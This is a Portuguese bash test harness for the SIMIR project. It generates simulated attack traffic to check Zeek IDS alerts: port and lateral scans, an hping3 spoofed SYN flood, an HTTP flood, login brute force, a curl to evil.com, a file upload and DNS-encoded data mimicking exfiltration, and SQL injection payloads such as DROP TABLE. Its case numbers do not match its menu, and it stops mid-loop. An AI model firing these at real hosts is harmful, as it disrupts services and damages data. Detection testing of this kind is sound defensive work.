#!/bin/bash
# Script para simulação de testes completo do Zeek

# Define o diretório base do SIMIR (diretório pai do scripts/)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SIMIR_DIR="$(dirname "$SCRIPT_DIR")"
LOGS_DIR="$SIMIR_DIR/logs"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║     SIMIR - Script de Testes completo                 ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════╝${NC}"
echo ""

# Verifica se o container está rodando
if ! docker ps | grep -q SIMIR_Z; then
    echo -e "${RED}Container SIMIR_Z não está rodando!${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Container SIMIR_Z está ativo${NC}"
echo ""

# Menu de testes
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}                    MENU DE TESTES SIMIR                        ${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${BLUE}┌─ TESTES ORIGINAIS ────────────────────────────────────────────┐${NC}"
echo ""
echo "  1) Port Scan Intenso"
echo "     → Escaneia 20 portas rapidamente (threshold: 15 portas)"
echo ""
echo "  2) Ataque de DoS - HTTP"
echo "     → 105 requisições HTTP em 60s (threshold: 100 conexões)"
echo ""
echo "  3) Ataque de DoS - Porta TCP"
echo "     → 105 conexões TCP customizadas em 60s"
echo ""
echo "  4) Ataque de DDoS com hping3"
echo "     → SYN flood com múltiplas origens (requer root)"
echo ""
echo "  5) Intelligence - Domínio Malicioso"
echo "     → Curl para g1.com (registrado como malicioso)"
echo ""
echo "  6) Intelligence - IP Malicioso"
echo "     → Curl para 10.20.30.40 (registrado como malicioso)"
echo ""
echo "  7) Força Bruta SSH/HTTP/FTP"
echo "     → 15+ tentativas de autenticação falhadas"
echo ""
echo "  8) Data Exfiltration"
echo "     → Simula upload/download de arquivos grandes"
echo ""
echo "  9) DNS Tunneling"
echo "     → Queries DNS com alta entropia e subdomínios longos"
echo ""
echo " 10) Lateral Movement"
echo "     → Scanning interno de RDP/SSH/SMB em múltiplos hosts"
echo ""
echo " 11) SQL Injection"
echo "     → Tentativas de SQLi em parâmetros HTTP"
echo ""
echo " 12) Beaconing (C2)"
echo "     → Conexões periódicas regulares simulando malware"
echo ""
echo " 13) Protocol Anomaly"
echo "     → HTTP/SSH em portas não-padrão"
echo ""
echo " 14) TESTE COMPLETO"
echo "     → Executa TODOS os testes acima sequencialmente"
echo ""
echo -e "${YELLOW}═══════════════════════════════════════════════════════════════${NC}"
echo ""
read -p "Digite sua escolha (1-14): " choice

case $choice in
    1)
        echo -e "\n${YELLOW}[*] Teste de Port Scan Intenso${NC}"
        echo -e "${YELLOW}⚠ IMPORTANTE: Não use IPs na whitelist (192.168.0.1, 192.168.1.1, 10.0.0.1)${NC}"
        echo -e "${YELLOW}   Sugestões: scanme.nmap.org, 192.168.0.50, ou seu próprio servidor${NC}\n"
        read -p "Digite o host alvo: " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}❌ Host não pode estar vazio${NC}"
            exit 1
        fi
        
        # Aviso se o usuário escolheu um IP na whitelist
        if [[ "$target" == "192.168.0.1" ]] || [[ "$target" == "192.168.1.1" ]] || [[ "$target" == "10.0.0.1" ]]; then
            echo -e "${RED}⚠ AVISO: IP $target está na whitelist do detector!${NC}"
            echo -e "${YELLOW}   O detector NÃO irá gerar alertas para este IP.${NC}"
            read -p "Deseja continuar mesmo assim? (s/n): " confirm
            if [ "$confirm" != "s" ]; then
                echo -e "${YELLOW}Teste cancelado${NC}"
                exit 0
            fi
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: 20 portas diferentes em 20 segundos${NC}"
        echo -e "${BLUE}[*] Threshold Port Scan: 15 portas em 10 minutos${NC}"
        echo -e "${YELLOW}[*] Isso deve gerar alertas de Port Scan${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "PortScan::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        # Escaneia 20 portas diferentes (acima do threshold de 15)
        # Usa portas comuns que provavelmente estarão fechadas
        portas_teste=(22 23 25 80 443 3306 5432 8080 8443 21 20 53 110 143 993 995 3389 5900 8000 9000)
        
        for port in "${portas_teste[@]}"; do
            # Timeout curto para forçar conexões rejeitadas/timeout
            timeout 0.3 nc -zv -w 1 "$target" "$port" 2>/dev/null || true
            echo -ne "${GREEN}Porta $port escaneada (${#portas_teste[@]} portas)${NC}\r"
            sleep 0.8
        done
        
        echo -e "\n${GREEN}✓ Teste concluído! 20 portas escaneadas${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (10 segundos)...${NC}"
        sleep 10
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "PortScan::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Port Scan:${NC}\n"
        grep -E "PortScan::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados neste teste: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
            echo -e "  • ${YELLOW}  Possíveis causas:${NC}"
            echo -e "    - IP está na whitelist (192.168.0.1, 192.168.1.1, 10.0.0.1)"
            echo -e "    - Threshold não atingido (necessário 15+ portas)"
            echo -e "    - Todas as portas responderam (conexões bem-sucedidas)"
            echo -e "    - Use 'scanme.nmap.org' ou '192.168.0.50' para testar"
        fi
        ;;
        
    2)
        echo -e "\n${YELLOW}[*] Iniciando Teste de DoS - HTTP${NC}"
        read -p "Digite o host alvo (ex: example.com ou 93.184.216.34): " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}Host não pode estar vazio${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: 105 requisições HTTP em 60 segundos${NC}"
        echo -e "${BLUE}[*] Threshold DoS: 100 conexões em 2 minutos${NC}"
        echo -e "${YELLOW}[*] Aguarde 60 segundos...${NC}\n"
        
        # 105 requisições com intervalo de 0.5s = ~52 segundos
        for i in {1..105}; do
            timeout 1 curl -s -o /dev/null "http://$target" 2>/dev/null || true
            echo -ne "${GREEN}Requisição $i/105 enviada${NC}\r"
            sleep 0.5
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando 5 segundos para processamento do Zeek...${NC}"
        sleep 5
        
        echo -e "\n${BLUE}[*] Verificando alertas no notice.log:${NC}\n"
        tail -10 $LOGS_DIR/notice.log | grep -E "DoS_Attack_Detected|DDoS_Attack_Detected" || echo -e "${YELLOW}⚠ Nenhum alerta de DoS/DDoS encontrado${NC}"
        ;;
        
    2)
        echo -e "\n${YELLOW}[*] Iniciando Teste de DoS - Porta TCP${NC}"
        read -p "Digite o host alvo (ex: 10.20.30.40 ou scanme.nmap.org): " target
        read -p "Digite a porta (ex: 80, 443, 8080): " port
        
        if [ -z "$target" ] || [ -z "$port" ]; then
            echo -e "${RED}Host e porta não podem estar vazios${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target:$port${NC}"
        echo -e "${BLUE}[*] Configuração: 105 tentativas de conexão TCP em 60 segundos${NC}"
        echo -e "${BLUE}[*] Threshold DoS: 100 conexões em 2 minutos${NC}"
        echo -e "${YELLOW}[*] Aguarde 60 segundos...${NC}\n"
        
        # 105 tentativas de conexão TCP com timeout
        for i in {1..105}; do
            timeout 1 nc -zv -w 1 "$target" "$port" 2>/dev/null || true
            echo -ne "${GREEN}Conexão $i/105 enviada${NC}\r"
            sleep 0.5
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando 5 segundos para processamento do Zeek...${NC}"
        sleep 5
        
        echo -e "\n${BLUE}[*] Verificando alertas no notice.log:${NC}\n"
        tail -10 $LOGS_DIR/notice.log | grep -E "DoS_Attack_Detected|DDoS_Attack_Detected" || echo -e "${YELLOW}⚠ Nenhum alerta de DoS/DDoS encontrado${NC}"
        ;;
        
    3)
        echo -e "\n${YELLOW}[*] Teste de DDoS (múltiplas origens)${NC}"
        
        # Verifica se hping3 está instalado
        if ! command -v hping3 &> /dev/null; then
            echo -e "${RED}hping3 não está instalado!${NC}"
            echo -e "${YELLOW}Instale com: sudo apt-get install hping3${NC}"
            exit 1
        fi
        
        read -p "Digite o host alvo: " target
        read -p "Digite a porta: " port
        
        if [ -z "$target" ] || [ -z "$port" ]; then
            echo -e "${RED}Host e porta não podem estar vazios${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target:$port${NC}"
        echo -e "${RED}⚠ ATENÇÃO: Este teste usa hping3 e pode ser detectado como ataque real${NC}"
        echo -e "${RED}⚠ Use apenas em ambientes controlados e com permissão${NC}"
        read -p "Deseja continuar? (s/n): " confirm
        
        if [ "$confirm" != "s" ]; then
            echo -e "${YELLOW}Teste cancelado${NC}"
            exit 0
        fi
        
        echo -e "${YELLOW}[*] Enviando 150 pacotes SYN com diferentes IPs de origem...${NC}"
        sudo hping3 -S -p "$port" -c 150 --flood --rand-source "$target" 2>/dev/null &
        HPING_PID=$!
        
        sleep 10
        kill $HPING_PID 2>/dev/null || true
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando 5 segundos para processamento do Zeek...${NC}"
        sleep 5
        
        echo -e "\n${BLUE}[*] Verificando alertas no notice.log:${NC}\n"
        tail -10 $LOGS_DIR/notice.log | grep -E "DoS_Attack_Detected|DDoS_Attack_Detected" || echo -e "${YELLOW}⚠ Nenhum alerta de DoS/DDoS encontrado${NC}"
        ;;
        
    4)
        echo -e "\n${YELLOW}[*] Teste de Port Scan Intenso${NC}"
        echo -e "${YELLOW}⚠ IMPORTANTE: Não use IPs na whitelist (192.168.0.1, 192.168.1.1, 10.0.0.1)${NC}"
        echo -e "${YELLOW}   Sugestões: scanme.nmap.org, 192.168.0.50, ou seu próprio servidor${NC}\n"
        read -p "Digite o host alvo: " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}❌ Host não pode estar vazio${NC}"
            exit 1
        fi
        
        # Aviso se o usuário escolheu um IP na whitelist
        if [[ "$target" == "192.168.0.1" ]] || [[ "$target" == "192.168.1.1" ]] || [[ "$target" == "10.0.0.1" ]]; then
            echo -e "${RED}⚠ AVISO: IP $target está na whitelist do detector!${NC}"
            echo -e "${YELLOW}   O detector NÃO irá gerar alertas para este IP.${NC}"
            read -p "Deseja continuar mesmo assim? (s/n): " confirm
            if [ "$confirm" != "s" ]; then
                echo -e "${YELLOW}Teste cancelado${NC}"
                exit 0
            fi
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: 20 portas diferentes em 20 segundos${NC}"
        echo -e "${BLUE}[*] Threshold Port Scan: 15 portas em 10 minutos${NC}"
        echo -e "${YELLOW}[*] Isso deve gerar alertas de Port Scan${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "PortScan::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        # Escaneia 20 portas diferentes (acima do threshold de 15)
        # Usa portas comuns que provavelmente estarão fechadas
        portas_teste=(22 23 25 80 443 3306 5432 8080 8443 21 20 53 110 143 993 995 3389 5900 8000 9000)
        
        for port in "${portas_teste[@]}"; do
            # Timeout curto para forçar conexões rejeitadas/timeout
            timeout 0.3 nc -zv -w 1 "$target" "$port" 2>/dev/null || true
            echo -ne "${GREEN}Porta $port escaneada (${#portas_teste[@]} portas)${NC}\r"
            sleep 0.8
        done
        
        echo -e "\n${GREEN}✓ Teste concluído! 20 portas escaneadas${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (10 segundos)...${NC}"
        sleep 10
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "PortScan::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Port Scan:${NC}\n"
        grep -E "PortScan::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados neste teste: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
            echo -e "  • ${YELLOW}  Possíveis causas:${NC}"
            echo -e "    - IP está na whitelist (192.168.0.1, 192.168.1.1, 10.0.0.1)"
            echo -e "    - Threshold não atingido (necessário 15+ portas)"
            echo -e "    - Todas as portas responderam (conexões bem-sucedidas)"
            echo -e "    - Use 'scanme.nmap.org' ou '192.168.0.50' para testar"
        fi
        ;;
        
    5)
        echo -e "\n${BLUE}[*] Realizando teste de assinatura de dominio:${NC}\n"
        echo -e "${YELLOW}[*] Executando curl http://evil.com...${NC}"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "Malicious_Domain_Hit" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        curl -s "http://evil.com" > /dev/null 2>&1 || true
        
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "Malicious_Domain_Hit" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de domínio malicioso:${NC}\n"
        grep -E "Malicious_Domain_Hit" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados neste teste: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado (verifique se o domínio está nos feeds)${NC}"
        fi
        ;;

      6)
        echo -e "\n${BLUE}[*] Realizando teste de assinatura de IP:${NC}\n"
        echo -e "${YELLOW}[*] Executando curl http://10.20.30.40 (timeout 3s)...${NC}"
        
        alertas_antes=$(grep -c "Malicious_IP_Hit" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        timeout 3 curl -s "http://10.20.30.40" > /dev/null 2>&1 || true
        
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "Malicious_IP_Hit" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de IP malicioso:${NC}\n"
        grep -E "Malicious_IP_Hit" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados neste teste: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado (verifique se o IP está nos feeds)${NC}"
        fi
        ;;

    7)
        echo -e "\n${BLUE}[*] Realizando teste de Força Bruta:${NC}\n"
        echo -e "${YELLOW}Escolha o tipo de teste de força bruta:${NC}"
        echo ""
        echo "  a) SSH - Simula 15 tentativas de login SSH falhadas"
        echo "  b) HTTP - Simula 20 tentativas HTTP 401 (autenticação)"
        echo "  c) FTP - Simula 15 tentativas FTP falhadas"
        echo ""
        read -p "Digite sua escolha (a/b/c): " brute_type
        
        case $brute_type in
            a)
                echo -e "\n${YELLOW}[*] Simulando tentativas de força bruta SSH...${NC}"
                read -p "Digite o host SSH alvo (ex: 192.168.0.1): " ssh_host
                
                if [ -z "$ssh_host" ]; then
                    echo -e "${RED}❌ Host não pode estar vazio${NC}"
                    exit 1
                fi
                
                echo -e "${BLUE}[*] Alvo: $ssh_host:22${NC}"
                echo -e "${BLUE}[*] Configuração: 15 tentativas de login em 30 segundos${NC}"
                echo -e "${BLUE}[*] Threshold Brute Force: 10 falhas em 5 minutos${NC}\n"
                
                # Conta alertas antes do teste
                alertas_antes=$(grep -c "BruteForce::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
                
                # 15 tentativas SSH com intervalo
                for i in {1..15}; do
                    # Usa sshpass ou apenas ssh com senha inválida
                    timeout 2 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 invalid_user@$ssh_host 2>/dev/null || true
                    echo -ne "${GREEN}Tentativa SSH $i/15${NC}\r"
                    sleep 2
                done
                
                echo -e "\n${GREEN}✓ Teste SSH concluído!${NC}"
                ;;
                
            b)
                echo -e "\n${YELLOW}[*] Simulando tentativas de força bruta HTTP...${NC}"
                read -p "Digite a URL alvo (ex: http://example.com/login): " http_url
                
                if [ -z "$http_url" ]; then
                    echo -e "${RED}❌ URL não pode estar vazia${NC}"
                    exit 1
                fi
                
                echo -e "${BLUE}[*] Alvo: $http_url${NC}"
                echo -e "${BLUE}[*] Configuração: 20 tentativas HTTP em 40 segundos${NC}"
                echo -e "${BLUE}[*] Threshold Brute Force: 10 falhas em 5 minutos${NC}\n"
                
                # Conta alertas antes do teste
                alertas_antes=$(grep -c "BruteForce::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
                
                # 20 tentativas HTTP com credenciais inválidas
                for i in {1..20}; do
                    timeout 2 curl -s -u "admin:wrongpass$i" "$http_url" > /dev/null 2>&1 || true
                    echo -ne "${GREEN}Tentativa HTTP $i/20${NC}\r"
                    sleep 2
                done
                
                echo -e "\n${GREEN}✓ Teste HTTP concluído!${NC}"
                ;;
                
            c)
                echo -e "\n${YELLOW}[*] Simulando tentativas de força bruta FTP...${NC}"
                read -p "Digite o host FTP alvo (ex: ftp.example.com): " ftp_host
                
                if [ -z "$ftp_host" ]; then
                    echo -e "${RED}❌ Host não pode estar vazio${NC}"
                    exit 1
                fi
                
                echo -e "${BLUE}[*] Alvo: $ftp_host:21${NC}"
                echo -e "${BLUE}[*] Configuração: 15 tentativas FTP em 30 segundos${NC}"
                echo -e "${BLUE}[*] Threshold Brute Force: 10 falhas em 5 minutos${NC}\n"
                
                # Conta alertas antes do teste
                alertas_antes=$(grep -c "BruteForce::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
                
                # 15 tentativas FTP
                for i in {1..15}; do
                    timeout 2 ftp -n $ftp_host <<EOF 2>/dev/null || true
user admin wrongpass$i
quit
EOF
                    echo -ne "${GREEN}Tentativa FTP $i/15${NC}\r"
                    sleep 2
                done
                
                echo -e "\n${GREEN}✓ Teste FTP concluído!${NC}"
                ;;
                
            *)
                echo -e "${RED}❌ Opção inválida${NC}"
                exit 1
                ;;
        esac
        
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "BruteForce::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Força Bruta:${NC}\n"
        grep -E "BruteForce::|BruteForce::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados neste teste: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
            echo -e "  • ${YELLOW}  Possíveis causas:${NC}"
            echo -e "    - Threshold não atingido (necessário 10+ falhas)"
            echo -e "    - Detector de brute force não está ativo"
            echo -e "    - Host não respondeu às tentativas"
        fi
        ;;
        
    8)
        echo -e "\n${YELLOW}[*] Teste de Data Exfiltration${NC}"
        read -p "Digite o host alvo: " target
        
        if [ -z "$target" ]; then
            echo -e "${RED}❌ Host não pode estar vazio${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target${NC}"
        echo -e "${BLUE}[*] Configuração: Transferência de 15MB em 30 segundos${NC}"
        echo -e "${BLUE}[*] Threshold: 10MB em 60 segundos${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "DataExfiltration::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        # Cria arquivo temporário de 15MB
        echo -e "${YELLOW}[*] Criando arquivo de teste (15MB)...${NC}"
        dd if=/dev/urandom of=/tmp/test_exfil_data.bin bs=1M count=15 2>/dev/null
        
        # Simula upload via HTTP POST (se o alvo tiver servidor web)
        echo -e "${YELLOW}[*] Simulando transferência de dados...${NC}"
        for i in {1..3}; do
            timeout 10 curl -X POST -F "file=@/tmp/test_exfil_data.bin" "http://$target/upload" 2>/dev/null || true
            echo -ne "${GREEN}Tentativa de upload $i/3${NC}\r"
            sleep 10
        done
        
        # Limpa arquivo temporário
        rm -f /tmp/test_exfil_data.bin
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "DataExfiltration::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Data Exfiltration:${NC}\n"
        grep "DataExfiltration::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
        fi
        ;;
        
    9)
        echo -e "\n${YELLOW}[*] Teste de DNS Tunneling${NC}"
        read -p "Digite o servidor DNS alvo (padrão: 8.8.8.8): " dns_server
        dns_server=${dns_server:-8.8.8.8}
        
        echo -e "${BLUE}[*] Servidor DNS: $dns_server${NC}"
        echo -e "${BLUE}[*] Configuração: Queries com alta entropia e subdomínios longos${NC}"
        echo -e "${BLUE}[*] Threshold: 5 queries suspeitas em 60 segundos${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "DNSTunneling::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}[*] Enviando queries DNS suspeitas...${NC}"
        
        # Gera queries com alta entropia e subdomínios longos (simulando DNS tunneling)
        for i in {1..10}; do
            # Query com subdomínio longo e alta entropia
            random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 50)
            dig @$dns_server "${random_str}.suspicious-tunnel-test.com" +short > /dev/null 2>&1 || true
            
            # Query com dados codificados (simulando exfiltração)
            encoded_data=$(echo "sensitive_data_$i" | base64 | tr -d '=' | tr '+/' '-_')
            dig @$dns_server "${encoded_data}.data-exfil-test.com" +short > /dev/null 2>&1 || true
            
            echo -ne "${GREEN}Query DNS $i/10${NC}\r"
            sleep 2
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "DNSTunneling::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de DNS Tunneling:${NC}\n"
        grep "DNSTunneling::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
        fi
        ;;
        
    10)
        echo -e "\n${YELLOW}[*] Teste de Lateral Movement${NC}"
        read -p "Digite a rede interna alvo (ex: 192.168.1): " network_prefix
        
        if [ -z "$network_prefix" ]; then
            echo -e "${RED}❌ Rede não pode estar vazia${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Rede alvo: $network_prefix.0/24${NC}"
        echo -e "${BLUE}[*] Configuração: Scanning de RDP/SSH/SMB em 6+ hosts${NC}"
        echo -e "${BLUE}[*] Threshold: 5 hosts diferentes em 5 minutos${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "LateralMovement::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}[*] Escaneando portas críticas (22-SSH, 445-SMB, 3389-RDP) em múltiplos hosts...${NC}"
        
        # Escaneia 8 hosts diferentes (acima do threshold de 5)
        hosts=(10 20 30 40 50 60 70 80)
        portas=(22 445 3389)
        
        for host_suffix in "${hosts[@]}"; do
            target_host="$network_prefix.$host_suffix"
            for port in "${portas[@]}"; do
                timeout 1 nc -zv -w 1 "$target_host" "$port" 2>/dev/null || true
            done
            echo -ne "${GREEN}Escaneando host $network_prefix.$host_suffix (${#hosts[@]} hosts)${NC}\r"
            sleep 2
        done
        
        echo -e "\n${GREEN}✓ Teste concluído!${NC}"
        echo -e "${YELLOW}[*] Aguardando processamento do Zeek (5 segundos)...${NC}"
        sleep 5
        
        # Conta alertas depois do teste
        alertas_depois=$(grep -c "LateralMovement::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        alertas_depois=$(echo "$alertas_depois" | tail -1)
        alertas_antes=$(echo "$alertas_antes" | tail -1)
        novos_alertas=$((alertas_depois - alertas_antes))
        
        echo -e "\n${BLUE}[*] Últimos 3 alertas de Lateral Movement:${NC}\n"
        grep "LateralMovement::" $LOGS_DIR/notice.log | tail -3 | awk -F'\t' '{print "  • " $12}' || echo -e "${YELLOW}  ⚠ Nenhum alerta encontrado${NC}"
        
        echo -e "\n${BLUE}[*] Estatísticas:${NC}"
        echo -e "  • Total de alertas históricos: ${YELLOW}$alertas_depois${NC}"
        if [ $novos_alertas -gt 0 ]; then
            echo -e "  • ${GREEN}✓ Novos alertas gerados: $novos_alertas${NC}"
        else
            echo -e "  • ${YELLOW}⚠ Nenhum novo alerta gerado${NC}"
        fi
        ;;
        
    11)
        echo -e "\n${YELLOW}[*] Teste de SQL Injection${NC}"
        read -p "Digite a URL alvo (ex: http://example.com/search): " target_url
        
        if [ -z "$target_url" ]; then
            echo -e "${RED}❌ URL não pode estar vazia${NC}"
            exit 1
        fi
        
        echo -e "${BLUE}[*] Alvo: $target_url${NC}"
        echo -e "${BLUE}[*] Configuração: 10 payloads SQLi em 30 segundos${NC}"
        echo -e "${BLUE}[*] Threshold: 5 tentativas em 60 segundos${NC}\n"
        
        # Conta alertas antes do teste
        alertas_antes=$(grep -c "SQLInjection::" $LOGS_DIR/notice.log 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}[*] Enviando payloads de SQL Injection...${NC}"
        
        # Array de payloads SQLi comuns
        payloads=(
            "' OR '1'='1"
            "admin'--"
            "1' UNION SELECT NULL--"
            "' OR 1=1--"
            "admin' OR '1'='1'--"
            "' DROP TABLE users--"
            "1'; DELETE FROM users--"
            "' AND 1=0 UNION ALL SELECT 'admin'--"
            "1' AND '1'='1"
            "' OR 'a'='a"
        )
        
        for payload in "${payloads[@]}"; do
            # Envia payload via GET parameter
            timeout 3 curl -s "${target_url}?id=${payload}" > /dev/null 2>&1 || true
            
            # Envia payload via POST
            timeout 3 curl -s -X POST -d "username=${payload}&password=test" "$target_url" > /dev/null 2>&1 || true
            
